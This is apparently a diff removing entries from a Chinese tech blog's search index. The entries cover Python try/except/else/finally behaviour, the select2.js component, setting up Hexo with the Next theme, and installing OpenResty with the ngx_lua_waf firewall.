-<p>如果代理失败，可能是Burpsuite版本太低，ssl默认为RC4算法，百度https不支持。</p>
-<p>Burpsuite的功能非常强大，以后慢慢学习。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Python中try/except/else/finally的执行机制]]></title>
-      <url>http://sha256.cc/2016/07/26/try-except-else-finally-in-Python/</url>
-      <content type="html"><![CDATA[<p>最近经常使用到try/except/else/finally全部子句，对于执行顺序不是很熟悉，这里作一下记录。<a id="more"></a></p>
-<h2 id="不含return的情况"><a href="#不含return的情况" class="headerlink" title="不含return的情况"></a>不含return的情况</h2><h3 id="一般情况"><a href="#一般情况" class="headerlink" title="一般情况"></a>一般情况</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'try'</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'finally'</span></span><br></pre></td></tr></table></figure>
-<p>output:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">finally</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="try子句异常"><a href="#try子句异常" class="headerlink" title="try子句异常"></a>try子句异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'try'</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'finally'</span></span><br></pre></td></tr></table></figure>
-<p>output:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">except</span></span><br><span class="line"><span class="keyword">finally</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="try-except子句同时异常"><a href="#try-except子句同时异常" class="headerlink" title="try/except子句同时异常"></a>try/except子句同时异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'try'</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'finally'</span></span><br></pre></td></tr></table></figure>
-<p>output:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">finally</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"E:\tmp\test.py"</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span>/<span class="number">0</span></span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> /: <span class="string">'str'</span> <span class="keyword">and</span> <span class="string">'int'</span></span><br></pre></td></tr></table></figure>
-<h3 id="else子句异常"><a href="#else子句异常" class="headerlink" title="else子句异常"></a>else子句异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'try'</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'else'</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'finally'</span></span><br></pre></td></tr></table></figure>
-<p>output:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try</span><br><span class="line">finally</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;E:\tmp\test.py&quot;, line 12, in &lt;module&gt;</span><br><span class="line">    t()</span><br><span class="line">  File &quot;E:\tmp\test.py&quot;, line 7, in t</span><br><span class="line">    print &apos;else&apos;/0</span><br><span class="line">TypeError: unsupported operand type(s) for /: &apos;str&apos; and &apos;int&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="finally子句异常"><a href="#finally子句异常" class="headerlink" title="finally子句异常"></a>finally子句异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'try'</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'finally'</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure>
-<p>output:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"E:\tmp\test.py"</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    t()</span><br><span class="line">  File <span class="string">"E:\tmp\test.py"</span>, line <span class="number">9</span>, <span class="keyword">in</span> t</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'finally'</span>/<span class="number">0</span></span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> /: <span class="string">'str'</span> <span class="keyword">and</span> <span class="string">'int'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
-<li>finally子句总会执行</li>
-<li>除了try子句，其他子句中的异常都会抛出</li>
-</ol>
-<h2 id="包含return的情况"><a href="#包含return的情况" class="headerlink" title="包含return的情况"></a>包含return的情况</h2><p>众所周知，return会直接跳出函数，那么它和异常机制的优先级如何呢？</p>
-<h3 id="try子句return"><a href="#try子句return" class="headerlink" title="try子句return"></a>try子句return</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'try'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'except'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'finally'</span></span><br><span class="line"></span><br><span class="line">t()</span><br></pre></td></tr></table></figure>
-<p>output:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try</span><br><span class="line">finally</span><br></pre></td></tr></table></figure>
-<p>else子句没有执行！finally子句仍然执行！ </p>
-<h3 id="finally子句return"><a href="#finally子句return" class="headerlink" title="finally子句return"></a>finally子句return</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'try'</span>/<span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'except'</span>/<span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'finally'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> t()</span><br></pre></td></tr></table></figure>
-<p>output:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">finally</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
-<p>函数的返回值是3，而不是try子句中设置的0，而且except子句的异常不见了。但是如果注释掉finally子句的return，就可以看见except中抛出的异常。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'try'</span>/<span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'except'</span>/<span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'else'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'finally'</span></span><br><span class="line">        <span class="comment"># return 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> t()</span><br></pre></td></tr></table></figure>
-<p>output:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">finally</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"E:\tmp\test.py"</span>, line <span class="number">15</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">print</span> t()</span><br><span class="line">  File <span class="string">"E:\tmp\test.py"</span>, line <span class="number">6</span>, <span class="keyword">in</span> t</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'except'</span>/<span class="number">0</span></span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> /: <span class="string">'str'</span> <span class="keyword">and</span> <span class="string">'int'</span></span><br></pre></td></tr></table></figure>
-<p>这是为什么呢？其实官方文档里有讲：</p>
-<blockquote>
-<p>A finally clause is always executed before leaving the try statement, whether an exception has occurred or not. When an exception has occurred in the try clause and has not been handled by an except clause (or it has occurred in a except or else clause), it is <strong>re-raised after the finally clause has been executed</strong>. The finally clause is also executed “on the way out” when any other clause of the try statement is left via a break, continue or return statement.</p>
-</blockquote>
-<p>也就是说except、esle子句中的异常在finally子句执行之后才会抛出，但是finally直接return了，所以我们就看不到异常了，而且会覆盖本身的return值。这种用法显然是不符合初衷的，所以不建议在finally语句中使用<code>return</code>、<code>break</code>、<code>continue</code>这些跳出的语句，应仅用作资源释放操作，否则会出现意想不到的结果。</p>
-<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol>
-<li>执行顺序 finally &gt; return &gt; else</li>
-<li>finally的return会抑制其他子句异常抛出，不建议使用</li>
-</ol>
-<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">(id)</span>:</span></span><br><span class="line">    db = get_db()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> db.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            sql = <span class="string">'''update xxxx</span><br><span class="line">                        set yyyy = yyyy + 1</span><br><span class="line">                      where id = %s'''</span></span><br><span class="line">            cursor.execute(sql, (id,))</span><br><span class="line">        db.commit()</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        app.logger.error(e, exc_info=<span class="keyword">True</span>)</span><br><span class="line">        db.rollback()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># do sth else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        db.close()</span><br></pre></td></tr></table></figure>
-<p>注意<code>return</code>的位置和<code>finally</code>子句的用法。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[支持select和input的JS组件]]></title>
-      <url>http://sha256.cc/2016/07/21/7-%E6%94%AF%E6%8C%81select%E5%92%8Cinput%E7%9A%84JS%E7%BB%84%E4%BB%B6/</url>
-      <content type="html"><![CDATA[<p>其实一直以来都不喜欢写JS，但是工作中又不可避免的要写一些前台的用户交互，之前每次都是现写现查，以至于写了不少前端代码都没有积累。既然不能逃避，不如选择接受，从现在起开始有意识得积累一些前端经验。<a id="more"></a></p>
-<p>JS作为一门语言，其设计品味不敢恭维，但是得益于多年在浏览器上的耕耘，无数前端工作者在其上面的工作令其大放异彩。从早期的JQuery到现在的AngularJS、ReactJS、NodeJS，JS自身的语义设计也随着ES6的发布变得越来越完善，也许JS未来会成为一门“真正”的好语言吧。</p>
-<p>扯了那么多，现在进入正题。作为一个业余的JS开发者，自己开发组件显然不是一种好选择，在我碰到一个既可以让用户选择也能让用户自行输入的表单字段时陷入了困扰。在<code>github</code>上的搜索让我找到了<code>select2.js</code>这个组件，真的非常强大。</p>
-<p>其中一个选项满足了我的业务：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- 必要文件的包含 --&gt;</span><br><span class="line">&lt;script type="text/javascript" src="dist/js/select2.min.js"&gt;&lt;/script&gt;</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">&lt;!-- select 框 --&gt;</span><br><span class="line">&lt;select name="handler" class="form-control js-example-tags" multiple="multiple"&gt;</span><br><span class="line">    &lt;option value="1"&gt;orange&lt;/option&gt;</span><br><span class="line">    &lt;option value="2"&gt;purple&lt;/option&gt;</span><br><span class="line">    &lt;option value="3"&gt;bule&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 启用组件 --&gt;</span><br><span class="line">$(<span class="string">".js-example-tags"</span>).select2(&#123;</span><br><span class="line">  tags: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<p><img src="/images/select-tag.png" alt="select-tag"></p>
-<p>更多用法：<a href="http://select2.github.io/examples.html#tags" target="_blank" rel="external">http://select2.github.io/examples.html#tags</a></p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Hexo使用体验]]></title>
-      <url>http://sha256.cc/2016/07/01/6-Hexo%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-      <content type="html"><![CDATA[<p>最早开始搭建个人博客的时候使用WordPress，光安装环境就折腾了许久，而且很多静态资源默认都是国外的，加载缓慢，替换起来也很麻烦。</p>
-<p>于是后来就开始体验一些静态博客，从最知名的jekyll，到python开发的pelican，然后是go语言写的hugo，使用过程都不太满意，直到我遇见了Hexo &amp; Next。<br><a id="more"></a></p>
-<h2 id="Why-Hexo"><a href="#Why-Hexo" class="headerlink" title="Why Hexo"></a>Why Hexo</h2><p>其实我很早知道hexo，在github上面stars的数量也很高，但是年少的我对NodeJS带有偏见，以至于一路过来都没有尝试她。<br>下面是我选择她的一些理由:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">工具</th>
-<th style="text-align:center">文章生成速度</th>
-<th style="text-align:center">配置部署</th>
-<th style="text-align:center">主题</th>
-<th style="text-align:center">开发者</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">Jekyll/Pelican</td>
-<td style="text-align:center">慢</td>
-<td style="text-align:center">简单</td>
-<td style="text-align:center">多</td>
-<td style="text-align:center">外国人</td>
-</tr>
-<tr>
-<td style="text-align:center">Hugo</td>
-<td style="text-align:center">快</td>
-<td style="text-align:center">麻烦(go的很多代码被墙了)</td>
-<td style="text-align:center">较少</td>
-<td style="text-align:center">外国人</td>
-</tr>
-<tr>
-<td style="text-align:center">Hexo</td>
-<td style="text-align:center">快</td>
-<td style="text-align:center">简单</td>
-<td style="text-align:center">很多很好看（js毕竟是前端程序员的主力武器）</td>
-<td style="text-align:center">台湾</td>
-</tr>
-</tbody>
-</table>
-<p>所以我放弃Pelican的理由是太慢了，放弃Hugo的理由是因为找不到我想要的主题，而且本地化支持不是很好。<br>Hexo部署简单，性能也还不错，但是仅仅如此是不够。最重要的是因为<strong>Next</strong>。</p>
-<h2 id="Why-Next"><a href="#Why-Next" class="headerlink" title="Why Next"></a>Why Next</h2><p>Next是Github上面starts数最多的Hexo主题，最重要的是她是国人开发的，有着对本地化最完美的支持。</p>
-<p>比如我们使用多说评论框，在Hugo上要去改写测试layouts文件，很容易出错，但是在Next里你只需要把你的duoshuoID配置在_config.yaml文件里就可以了。  </p>
-<p>此外她有丰富的国人编写的插件及简洁优美的外观，配合Nginx和国内JS、CSS的CDN，性能表现近乎完美。<br>具体的介绍可以参考<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">Next主页</a>。</p>
-<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><p>Hexo是用Node开发的，所以我们需要先安装Node。  </p>
-<p>安装方式有：</p>
-<ol>
-<li><code>yum install nodejs</code>  </li>
-<li>nvm安装</li>
-<li><a href="https://nodejs.org/en/download/" target="_blank" rel="external">官网</a> 安装</li>
-</ol>
-<p>推荐第一种，因为hexo对node没有特殊要求，采用最方便的方式安装即可。</p>
-<p>node的包管理工具叫做npm，hexo就是用它安装，但是默认配置的npm是国外的，速度不稳定，所以建议修改为国内源:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim ~/.profile</span><br></pre></td></tr></table></figure>
-<p>添加</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node</span><br></pre></td></tr></table></figure>
-<p>到文件尾，然后执行<code>source ~/.profile</code>使配置生效。</p>
-<p>然后安装hexo，一行搞定:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure></p>
-<h2 id="部署Hexo"><a href="#部署Hexo" class="headerlink" title="部署Hexo"></a>部署Hexo</h2><p>设置你的博客<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init blog</span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br></pre></td></tr></table></figure></p>
-<p>安装Next<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></p>
-<p>启用主题，打开blog/_config.yaml， 找到 theme 字段，并将其值更改为 next<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></p>
-<p>开启服务<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line"><span class="comment"># 默认监听localhost:4000，可以通过-i参数指定ip(不能写0.0.0.0)</span></span><br><span class="line"><span class="comment"># eg. hexo server -i `xxx.com`</span></span><br></pre></td></tr></table></figure></p>
-<p>这个时候访问localhost:4000就能看到博客默认的样子了，<strong>不过建议实际部署的时候不要用hexo直接作为web服务器，而用分发好的静态文件直接部署在nginx上比较好，因为Nginx作为服务器性能比Hexo强，资源占用少。hexo server只是在我们预览效果的时候使用。</strong></p>
-<p>其他命令：</p>
-<ul>
-<li><p>创建文章</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"Hello Hexo"</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>生成静态文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>分发静态文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>静态文件还可以通过git直接部署在github上面，利用github搭建自己的静态博客。具体方法就不多说了。<br>当然，本博客就是用Hexo &amp; Next搭建在Nginx之上 ^_^</p>
-<h2 id="同步Hexo"><a href="#同步Hexo" class="headerlink" title="同步Hexo"></a>同步Hexo</h2><p>如果你只在一台电脑上写博客，你就不需要看这一部分。但是如果你有在多机上写博客的需求，那么解决Hexo同步的问题就很必要了。</p>
-<p>Hexo的部署命令针对public里的静态文件，对于文章源文件和配置等没有同步功能，除非你每次写完博客都把源文件存储在一个公共的地方，要不然你没有办法接下来承接之前的文章继续写作。</p>
-<p>我在网路上搜索了一下，一般有这么几个解决方法：</p>
-<ul>
-<li>用DropBox同步源文件</li>
-<li>把源文件存放在服务器上</li>
-<li>使用<a href="https://github.com/coneycode/hexo-git-backup" target="_blank" rel="external">hexo-git-backup</a></li>
-<li>使用git保存源代码(建议)</li>
-</ul>
-<p>我本身的源文件就是存放在服务器上，所以不方便使用云来存储代码，hexo-git-backup这个插件对于太新的node也不支持，所以我选择使用git保存源代码。</p>
-<p>使用git不仅能够解决同步问题，也可以解决回滚问题，而且也是作者建议的方式——如果你发现了目录里的.gitignore——你应该也会这么认为。</p>
-<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>假设你把网站搭建在github上面，那么master分支保存静态文件，可以新建hexo分支保存源文件。</p>
-<p>首先把本地代码提交到远端，确保远端仓库不存在hexo分支或者hexo分支为空。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line"><span class="comment"># 新建本地仓库</span></span><br><span class="line">$ git init</span><br><span class="line"><span class="comment"># 新建并切换到hexo分支</span></span><br><span class="line">$ git checkout -b hexo</span><br><span class="line"><span class="comment"># 本地提交</span></span><br><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">'init'</span></span><br><span class="line"><span class="comment"># 配置远端仓库地址</span></span><br><span class="line">$ git remote add git@github.com:xxxx/xxxx.github.io.git</span><br><span class="line"><span class="comment"># 远端提交</span></span><br><span class="line">$ git push origin hexo</span><br></pre></td></tr></table></figure></p>
-<p>至此同步配置已经结束，之后每次修改或者新增文件我们需要在本地（确保在hexo分支）提交源文件至远端hexo分支，然后运行<code>hexo g -d</code>即可。</p>
-<h3 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h3><p>如果重装了电脑或者换了电脑，安装git、node、npm、hexo之后，依次执行以下命令即可:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置新电脑的sshkey到github，否则选择https方式clone</span></span><br><span class="line">$ git <span class="built_in">clone</span> git@github.com:xxxx/xxxx.github.io.git -b hexo blog</span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line"><span class="comment"># 安装hexo依赖，确保之前安装hexo模块时没有漏掉--save选项</span></span><br><span class="line"><span class="comment"># eg. npm install hexo-deployer-git --save</span></span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></p>
-<p>无须执行<code>hexo init</code>。</p>
-<h3 id="弊端"><a href="#弊端" class="headerlink" title="弊端"></a>弊端</h3><p>因为github上面repo是公开的，而源文件中会有一些不宜公开的数据配置，所以更保险的做法是使用私人的代码仓库保存源代码，比如收费的github private，或者<a href="http://git.oschina.net/" target="_blank" rel="external">码云</a>。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Ngx_lua_waf搭建步骤]]></title>
-      <url>http://sha256.cc/2016/06/30/5-Ngx-lua-waf%E6%90%AD%E5%BB%BA%E6%AD%A5%E9%AA%A4/</url>
-      <content type="html"><![CDATA[<p>Ngx_lua_waf是一个web防火墙，主要通过lua实现，安装简单，性能优异，由国人loveshell开发。<br><a id="more"></a></p>
-<blockquote>
-<p><a href="https://github.com/loveshell/ngx_lua_waf" target="_blank" rel="external">ngx_lua_waf</a>是我刚入职趣游时候开发的一个基于ngx_lua的web应用防火墙。</p>
-<p>代码很简单，开发初衷主要是使用简单，高性能和轻量级。</p>
-<p>现在开源出来，遵从MIT许可协议。其中包含我们的过滤规则。如果大家有什么建议和想法，欢迎和我一起完善。</p>
-</blockquote>
-<p>主页上介绍的安装流程不是很详细，我这里详细记录了一下。</p>
-<h2 id="安装openresty平台"><a href="#安装openresty平台" class="headerlink" title="安装openresty平台"></a>安装openresty平台</h2><p>OpenResty 是一个基于 NGINX 和 LuaJIT 的 Web 平台,相当于集成了lua的Nginx，比自己编译安装Nginx+Lua要方便很多。步骤如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换至root用户</span></span><br><span class="line">su</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预装环境</span></span><br><span class="line">yum install readline-devel pcre-devel openssl-devel gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载安装包</span></span><br><span class="line">wget https://openresty.org/download/openresty-1.9.7.4.tar.gz</span><br><span class="line">tar zxvf openresty-1.9.7.4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openresty-1.9.7.4.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-<p>安装如果出现问题，可以参考 <a href="http://openresty.org/cn/installation.html" target="_blank" rel="external">http://openresty.org/cn/installation.html</a></p>
-<p>默认安装位置在/usr/local/openresty/nginx，修改conf/nginx.conf指定运行nginx worker的用户：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br></pre></td></tr></table></figure>
-<p>如果没有nginx用户，在root权限下运行useradd nginx即可添加。</p>
-<p>如果是用systemctl管理服务，创建/lib/systemd/system/nginx.service文件，填写如下内容：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx</span><br><span class="line">ExecReload=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx <span class="_">-s</span> reload</span><br><span class="line">ExecStop=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx <span class="_">-s</span> stop</span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
-<p>即可使用systemctl命令管理nginx服务：</p>
-<ul>
-<li><p><strong>启动</strong> systemctl start nginx</p>
-</li>
-<li><p><strong>关闭</strong> systemctl stop nginx</p>
-</li>
-<li><p><strong>重启</strong> systemctl restart nginx</p>
-</li>
-<li><p><strong>开启自启动</strong> systemctl enable nginx</p>
-</li>
-</ul>
-<h2 id="部署Ngx-lua-waf"><a href="#部署Ngx-lua-waf" class="headerlink" title="部署Ngx_lua_waf"></a>部署Ngx_lua_waf</h2><p>下载安装包到nginx配置目录，重命名为waf：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/openresty/nginx/conf</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/loveshell/ngx_lua_waf.git waf</span><br></pre></td></tr></table></figure>
-<p>然后修改Nginx.conf，在http下面增加以下waf配置：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_<span class="built_in">type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Lua包的路径</span></span><br><span class="line">    lua_package_path <span class="string">"/usr/local/openresty/nginx/conf/waf/?.lua"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Lua运行时最大内存</span></span><br><span class="line">    lua_shared_dict <span class="built_in">limit</span> 10m;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Waf启动脚本</span></span><br><span class="line">    init_by_lua_file /usr/<span class="built_in">local</span>/openresty/nginx/conf/waf/init.lua;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Waf过滤逻辑脚本</span></span><br><span class="line">    access_by_lua_file /usr/<span class="built_in">local</span>/openresty/nginx/conf/waf/waf.lua;</span><br><span class="line"></span><br><span class="line">    ···</span><br></pre></td></tr></table></figure>
-<p>然后配置waf下的config.lua文件，主要是waf规则目录(RulePath)和日志目录(logdir):</p>
